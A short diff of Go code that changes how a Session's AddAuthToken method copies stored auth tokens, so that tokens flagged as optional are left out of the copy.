@@ -57,7 +57,9 @@ func (s *Session) AddAuthToken(domain string, key string, value string, path str
 	for k, v := range authTokens {
 		tcopy[k] = []AuthToken{}
 		for _, at := range v {
-			tcopy[k] = append(tcopy[k], *at)
+			if !at.optional {
+				tcopy[k] = append(tcopy[k], *at)
+			}
 		}
 	}
 
